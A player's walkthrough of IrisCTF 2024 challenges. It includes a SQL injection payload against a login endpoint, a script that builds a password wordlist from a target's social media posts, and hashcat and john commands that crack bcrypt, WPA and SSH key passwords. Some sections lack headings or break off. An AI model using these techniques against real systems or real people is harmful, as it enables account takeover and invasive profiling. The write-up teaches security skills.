I participated in the IrisCTF 2024 solo, and surpassed my expectations majorly. The following is a writeup/walkthrough of how each flag was grabbed and the thought process for each.

You can join the Discord community (with more writeups!) [here](https://discord.gg/W5ZgAmBgjP).

## Web Exploitation/What's My Password? (422 solves)
Created by: `User`

> [baby] Oh no! Skat forgot their password (again)!
Can you help them find it?

Looking at the website we are faced with a login page.

![Login Page](wmp_1.png)

There is an SQL database in the local version:

```sql
CREATE DATABASE uwu;
use uwu;

CREATE TABLE IF NOT EXISTS users ( username text, password text );
INSERT INTO users ( username, password ) VALUES ( "root", "IamAvEryC0olRootUsr");
INSERT INTO users ( username, password ) VALUES ( "skat", "fakeflg{fake_flag}");
INSERT INTO users ( username, password ) VALUES ( "coded", "ilovegolang42");

CREATE USER 'readonly_user'@'%' IDENTIFIED BY 'password';
GRANT SELECT ON uwu.users TO 'readonly_user'@'%';
FLUSH PRIVILEGES;
```

So we can see the flag is stored on the user `skat`.

Looking at the Go source code, this is of interest:

```go
matched, err := regexp.MatchString(UsernameRegex, input.Username)
if err != nil {
	w.WriteHeader(http.StatusInternalServerError)
	return
}

if matched {
	w.WriteHeader(http.StatusBadRequest)
	w.Write([]byte("Username can only contain lowercase letters and numbers."))
	return
}

qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)
```

There is filtering/checking on the username param, and none on the password field, so we can exploit that with SQLi!

I send the following JSON payload to the login endpoint: 
```json
{
	"username":"skat",
	"password":"\" OR (username = \"skat\" AND password LIKE \"%\") OR \""
}
```

`LIKE` is used to select if its similar to a string, for example if we wanted a string that starts with `test` and not care about the suffix, we can use `LIKE "test%"`. In this case using just `%` effectively acts as a wildcard.

Response: 
```json
{
	"username":"skat",
	"password":"irisctf{my_p422W0RD_1S_SQl1}"
}
```

And there's the flag! <mark>irisctf{my_p422W0RD_1S_SQl1}</mark>

## Open-Source Intelligence/Czech Where? (401 solves)
Created by: `Lychi`
> Iris visited this cool shop a while back, but forgot where it was! What street is it on?
FYI: flag is all lowercase and _ for spaces. Please remove all accent marks if there are any. Wrap your answer in irisctf{}.

We start with a photo and the challenge to find what street it was on, we are given the following photo:

![Picture of storefront](cw_1.png)

Using some searching on Google Maps, we can find a similar logo but not the same storefront.

Searching "Czech wooden products" online yields [this result](https://www.forpraguelovers.com/en/best/wood-shops-in-prague) (among others).

On this page I spot the logo again, and this time we have a website: [amadea.cz](https://www.amadea.cz/)

I find the [list of stores](https://www.amadea.cz/en/wooden_shops/) by searching for the domains stores list.

Inside here we see the same storefront from the photo, located at `Prague Castle in Zlatá ulička (Golden Lane), No. 20.`

![Storefront on website](cw_2.png)

Looking up the address on Google Maps we are given the full street name: `Zlatá ulička u Daliborky`

There's our flag! <mark>irisctf{zlata_ulicka_u_daliborky}</mark>

## Open-Source Intelligence/Away on Vacation (255 solves)
Created by: `Lychi`

> Iris and her assistant are away on vacation. She left an audio message explaining how to get in touch with her assistant. See what you can learn about the assistant.

We are given a voicemail of a person named 'Iris'. For convinience, we are given a transcript of the audio file.

```
Hello, you’ve reached Iris Stein, head of the HR department! I’m currently away on vacation, please contact my assistant Michel. You can reach out to him at michelangelocorning0490@gmail.com. Have a good day and take care.
```

Doing a lookup of the email on [epieos.com](https://epieos.com/) and find the full name of the Google account is `Michelangelo Corning` (shocker).

When we lookup his name, we come across a [LinkedIn](https://www.linkedin.com/in/michelangelo-corning-6b1b7a2a4/) and an [Instagram](https://www.instagram.com/michelangelo_corning/)!

![LinkedIn](aov_1.png)

![Instagram](aov_2.png)

Browsing his Instagram posts, one post catches my eye and the description contains our flag!

## Open-Source Intelligence/Personal Breach (173 solves)
Created by: `Lychi`

> Security questions can be solved by reconnaissance. The weakest link in security could be the people around you.

We are looking for the following information points about Iris:
- How old is Iris?
- What hospital was Iris born in?
- What company does Iris work for?

Looking through what we have, in the tagged posts section of Michelangelo's Instagram is a post!

![Post tagging Michelangelo](pb_1.png)

It's from Iris, we can now look through her Instagram.

![Iris's Instagram](pb_2.png)

Looking through her posts, a particular one jumps out at me:

![Post mentioning mother](pb_3.png)

We can see she mentions an `Elaina Stein` and trying to visit an Instagram with that tag fails, so I check Facebook and get a hit!

![Elaina's Facebook](pb_4.png)

Looking through her posts, we find two birthdays. One for herself (8th of April 1965) and for Iris (27th of April 1996).

We now know Iris's age to be `27`.

In the comments of the birthday post is Elaina with some extra information.

![Facebook Comment](pb_5.png)

By searching for the exact phrase "best maternity hospital in Manhattan" we get a hit on [Yelp](https://www.yelp.com/search?find_desc=maternity+hospital&find_loc=Manhattan%2C+NY).

Our top result is `Lenox Hill Hospital`, so there's our hospital.

![Hospital Review](pb_6.png)

Looking up Iris's name online we also get a [LinkedIn](https://www.yelp.com/search?find_desc=maternity+hospital&find_loc=Manhattan%2C+NY).

![LinkedIn for Iris](pb_7.png)

And there's her job! `Mountain Peak Hiring Agency`

## Open-Source Intelligence/A Harsh Reality of Passwords (28 solves)
Created by: `Lychi`
> Recently, Iris's company had a breach. Her password's hash has been exposed. This challenge is focused on understanding Iris as a person. The flag format is irisctf{plaintextPassword}. Hash: $2b$04$DkQOnBXHNLw2cnsmSEdM0uyN3NHLUb9I5IIUF3akpLwoy7dlhgyEC


Hint Given:
> Focus on Iris and what she finds important!
There are three words (not letters, but words), and a certain amount of numbers following it
There's no leet words, proper capitalization nothing like (ExAmPLE), no special characters as well like -,! etc.

We start with a hash (`$2b$04$DkQOnBXHNLw2cnsmSEdM0uyN3NHLUb9I5IIUF3akpLwoy7dlhgyEC`) that is a `bcrypt $2*$, Blowfish (Unix)` hash.

We know we need to use 3 words, and some numbers following it. A few posts are of interest for our password.

Firstly, the one about her Mum.

![Mimosas](pb_3.png)

We can see that she calls her Mothers birthday a 'very important date', I think those are our numbers.

![Tiramisu](ahrop_1.png)

Here, she expresses her 'obsession' with Tiramisu, thats going on the wordlist.

![Portofino](ahrop_2.png)

In this post she talks about a specific place in Italy, Portofino.

She expresses in a few other posts some places she's been, things she likes, etc. In the end I construct the following list of words from posts and who they follow.

```
netherland
italy
berlin
tiramisu
czechia
mimosa
portofino
swan
swarovski
crystal
starbuck
milan
conte
ugolino
sunrise
sunset
karadenizli
maceraci
iris
stein
station
elaina
lenox
hill
hospital
food
traveling
sunny
sanfrancisco
```

I then write a Python script to generate all our combinations and appropriate 'variants' (eg. portofino = Portofino,portofinos,Portofinos,portofino), and the date at the end is following a mmddyyyy format (due to the organisers being mainly from the US). 

We have to consider that when people use dates in passwords they are not always going to use a perfect format with 0's, so there are possibilities.

```python
numbers=['481965','0481965','04081965','4081965']
import os

c=0
with open('wordlistfinal.txt','w') as ff:
	with open('words.txt','r') as f:
		data=f.readlines()
		newdata=[]
		for x in data:
			newdata.append(x.title())
			newdata.append(x.title()+'s')
			newdata.append(x+'s')
			newdata.append(x)
		data=newdata
		for x in data:
			for y in data:
				for z in data:
					for n in numbers:
						pw=x.replace('\n','')+y.replace('\n','')+z.replace('\n','')+n
						ff.write(pw+'\n')
						c+=1
print(f'Found {c} new passwords.')
```

```
$ python3 wordgen.py
Found 6243584 new passwords.
```

Now we wait, and crack with hashcat, until we get a hit!

```
$ hashcat -m 3200 hash wordlist.txt
...
$2b$04$DkQOnBXHNLw2cnsmSEdM0uyN3NHLUb9I5IIUF3akpLwoy7dlhgyEC:PortofinoItalyTiramisu0481965
```

There's our password, and therefore our flag! <mark>irisctf{PortofinoItalyTiramisu0481965}</mark>

## Networks/Where's skat? (134 solves)
Created by: `skat`

> While traveling over the holidays, I was doing some casual wardriving (as I often do). Can you use my capture to find where I went? Note: the flag is irisctf{the_location}, where the_location is the full name of my destination location, not the street address. For example, irisctf{Washington_Monument}. Note that the flag is not case sensitive.

We are given a PCAP file, and since we are asked where they went, (as in the destination) we can go to the end of the PCAP and look around. As they are wardriving they will be communicating with nearby routers.

We can see they are communicating with a CISCO router at the end, we can get the BSSID of this router and look it up on [Wigle](https://www.wigle.net/) for a location. [Wigle](https://www.wigle.net/) is an online index of scanned WiFi routers with GPS data attached, so if our BSSID is there we should get a rough location.

![Communication](ws_1.png)

BSSID: `10:05:ca:bb:40:11`

![Wigle Lookup](ws_2.png)

We get a hit, now where is it?

![Wigle Map](ws_3.png)

Looking at the structure marker nearby we seem to be at `Los Angeles Union Station`.

Which gives us the flag: <mark>irisctf{los_angeles_union_station}</mark>

## Networks/Copper Selachimorpha (27 solves)
Created by: `skat`

> Joe Schmoe was using his mobile hotspot and downloading some files. Can you intercept his communications?

Hint:
> Think very deeply about the premise of the challenge. You need to do a lot of analysis to recover the rest of the flag.

We start with a PCAP file that contains 802.11 (WiFi) traffic that we cannot read, due to us not having the password.

I extract the hash of the PCAP with [hashcat's online tool](https://hashcat.net/cap2hashcat/). I then ran the hash against the `rockyou.txt` list.

```
$ hashcat -a 0 -m 22000 hash rockyou.txt
...
humus12345
```

We get our password: `humus12345`

I then go to my Wireshark preferences, then Protocols > IEEE 802.11 and Edit the Decryption keys to add `humus12345` as a `wpa-pwd`.

The traffic is now decrypted and readable, we can see FTP communications.

Looking at the FTP commands and responses, we can see a portion of the flag already:

```

The first half of the flag is `irisctf{welc0me_t0_th3_n3twork_c4teg`, now we can see they are calling an image to download 4 times. Lets see that data.

When we right click on the FTP traffic and click `Follow... > TCP Stream`, we can see on TCP streams 2, 3, 5 and 6 that there is PNG data. We set `Show data as...` to Raw then Save each one to a file.

When we look through these PNGs we can see all of them are corrupted and missing portions, the reason for this is part of the struggle with sniffing over WiFi, the medium of air has other traffic and obstacles to a clear signal from a cable so sniffing is challenging.

Each PNG is missing different portions, so using a hex editor we can find the missing portions of each PNG and compile the missing bytes into one PNG. I do this with the 3rd image (from TCP stream 5) and search for the text 'missing' in my hex editor (010 Editor) and slowly find those portions from the other files by searching for the bytes just before the missing message. When replacing the message with bytes its important to replace the `.` following the `]` as otherwise we have incorrect bytes.

After some manual analysis we are given a readable file:

![Flag Part 2](cs_1.png)

Then compiling both parts gives us the final flag: <mark>irisctf{welc0me_t0_th3_n3twork_c4teg0ry_we_h0pe_you_enj0yed_th3_sh4rks}</mark>

## Forensics/skat's SD card (86 solves)
Created by: `skat`

> "Do I love being manager? I love my kids. I love real estate. I love ceramics. I love chocolate. I love computers. I love trains."

Looking through the file we are given its an image of a linux file system.

Once mounted with fuse (mac moment) we see `/home/skat` as a directory.

Looking around a few things catch my eye:

```
.bash_history
.mozilla/
.ssh/
```

Reading `.bash_history` there is a cloning of a git repo: `git@github.com:IrisSec/skats-interesting-things.git`.

Looking online this seems we lack authorisation to clone/view it.

Looking in `.ssh/` we can see `id_rsa`, due to the git clone command from `.bash_history` it's likely that these SSH creds authorise us to clone that repo.

The SSH has a password so we can crack the password with `john` and `ssh2john`.

```
$ ssh2john id_rsa > id_rsa.hash
$ john id_rsa --wordlist=rockyou.txt
password
```

Well, thats a secure password lmao.

Once we use the password with the SSH cred we can clone the repo locally.

Looking at the contents none of the files jump out at me, mostly just txt files of documentation and a very useless README. But, inside the `.git` folder are some pack files. Using `packfile_reader` we can extract the data to some text files.

`packfile_reader -e -o . pack-7359dfb3974f6464a5b192bba2d05f89f0b3aa4a.pack`

Then using `grep -r ‘{‘ .` I searched for the flag.

Found it! <mark>irisctf{0h_cr4p_ive_left_my_k3ys_out_4nd_ab0ut}</mark>

> "I love cats."
Note: this challenge is a continuation to Forensics/skat's SD Card. You are dealing with the same scenario. skats-sd-card.tar.gz is the same file from that challenge (SHA-1: 4cd743d125b5d27c1b284f89e299422af1c37ffc).

Looking at what were given, we have some 802.11 packets and we don't know the password, hashcracking was no good here so I went looking for a password.

Due to some recon from the home directory, this is likely a raspberry Pi. The Firefox data shows nothing of interest, the `Bookshelf` folder has a PDF for setting up a raspberry pi, so checking on the `/etc/NetworkManager` folder I see `system-connections` and then `skatnet.nmconnection`, which contains a WiFi password.

```
[connection]

auth-alg=open
key-mgmt=wpa-psk
psk=

[ipv4]
method=auto

[ipv6]
addr-gen-mode=default

[proxy]
```

We get our password: `agdifbe7dv1iruf7ei2v5op`

I then go to my Wireshark preferences, then Protocols > IEEE 802.11 and Edit the Decryption keys to add `agdifbe7dv1iruf7ei2v5op` as a `wpa-pwd`.

I then go to Protocols > TLS and setting the (Pre)-Master-Secret log file to the other file we are given (`sslkeyfile`) allows us to read the HTTPS traffic.

Looking through the traffic, specifically HTTP/2, a URL catches my eye.

![Pastebin](snh_1.png)

> I downloaded a video from the internet, but I think I got the wrong subtitles.
Note: The flag is all lowercase.

Looking at the video we can see some subtitles, using `mkvextract` we can pull out some files.

We can extract the everything using a [script on Gist](https://gist.github.com/konfou/05db32e11ee84efde0adba2ac34331f4) and inside the MKV are some TTFs and the subtitles.

## Forensics/Corrupted World (28 solves)
Created by: `rph`

> I was putting all my important items into a chest when Minecraft crashed. Now when I load my world, the chest is empty. Help me recover it's contents.

Notes:
- Game version: 1.20.2
- You don't need to own the game to solve this challenge

Hint:
> X: 104, Y: 63, Z: 248

The file we start with is a Minecraft Anvil file, specifically for the region 0,0. Regions contain chunks, and chunks contain blocks.

To get started I find what chunk my coordinates are actually in using [this tool](https://minecraft.tools/en/coordinate-calculator.php).

I find my chunk is `6,-15` (x,z).

Then reading the [region file format](https://minecraft.wiki/w/Region_file_format) I find we can extract the chunk data, and then decompress it from zlib, and then read the NBT data.

I write a python script to automatically parse and output the chunks in NBT data (parsing once the header data has been manually removed).

```python
import io, sys, math, zlib, nbtlib, os

print('Loading file...')
file=open("r.0.0.mca","rb")
data=file.read()
file.close()

count=0
print('Parsing...')
while len(data) > 0:
    length=(math.ceil(int.from_bytes(io.BytesIO(data).read(4), 'big')/4096)*4096)-5
    file_format=int.from_bytes(io.BytesIO(data[:5][4:]).read(1),'big')
    data=data[5:]
    writedata=data[:length]
    data=data[length:]
    with open(f'out/{count}.zlib', 'wb') as f:
            f.write(writedata)
            f.close()
    try:
        writedata=zlib.decompress(writedata)
        with open(f'out/{count}.nbt', 'wb') as f:
            f.write(writedata)
            f.close()
        nbt_file = nbtlib.load(f'out/{count}.nbt')
        print(int(nbt_file['']['xPos']),int(nbt_file['']['yPos']),int(nbt_file['']['zPos']))
        os.rename(f'out/{count}.nbt',f"out/{int(nbt_file['']['xPos'])},{int(nbt_file['']['yPos'])},{int(nbt_file['']['zPos'])},{count}.nbt")
    except:
        print(f'Error on chunk! {io.BytesIO(data[:4]).read(4)}, {length}, {file_format}')
    count+=1
```

First run we get some errors:
```
Error on chunk! b'\x86\x8b\xfb\xf8', 4091, 2
Error on chunk! b'', 2257321979, 140
```

Going to the first chunk that messed up in a hex editor (010 Editor), we can see that this chunk is actually 8KiB not 4 like the length says, so we edit the length bytes from '4094' (b'\x00\x00\x0f\xfe') to be '8192' (b'\x00\x00\x20\x00') which allows the script to finish with no errors.

Now let's look for our chunk files, we have two `-6,4,15` files. 
```
6,-4,15,246.nbt
6,-4,15,270.nbt
```

Searching through both in a hex editor, we see the `My Important Items` chest in both but only `246` has the items.

Parsing the items in a hex editor we can see a small 2 character string of text on each item.

Once constructed together we get the flag. <mark>irisctf{block_game_as_a_file_system}</mark>
